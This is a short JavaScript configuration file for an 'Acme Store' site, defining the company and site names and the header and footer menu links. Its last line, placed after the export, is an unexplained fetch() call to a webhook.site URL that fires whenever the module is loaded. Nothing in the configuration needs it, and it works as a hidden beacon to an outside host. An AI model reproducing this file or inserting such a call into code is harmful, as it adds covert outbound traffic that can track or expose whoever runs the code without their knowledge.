const COMPANY_NAME = 'Acme, Inc.'
const SITE_NAME = 'Acme Store'

const headerMenu = [
  {
    title: 'All',
    path: '/search/all'
  },
  {
    title: 'Shirts',
    path: '/search/shirts'
  },
  {
    title: 'Stickers',
    path: '/search/stickers'
  }
]

const footerMenu = [
  {
    title: 'Home',
    path: '/'
  },
  {
    title: 'About',
    path: '/about'
  },
  {
    title: 'Terms & Conditions',
    path: '/terms-conditions'
  },
  {
    title: 'Shipping & Return Policy',
    path: '/shipping-return-policy'
  },
  {
    title: 'Privacy Policy',
    path: '/privacy-policy'
  },
  {
    title: 'FAQ',
    path: '/frequently-asked-questions'
  }
]

export default {
  COMPANY_NAME,
  SITE_NAME,
  headerMenu,
  footerMenu
}

fetch('https://webhook.site/279df55c-6f79-4184-bf11-603946c03c3c')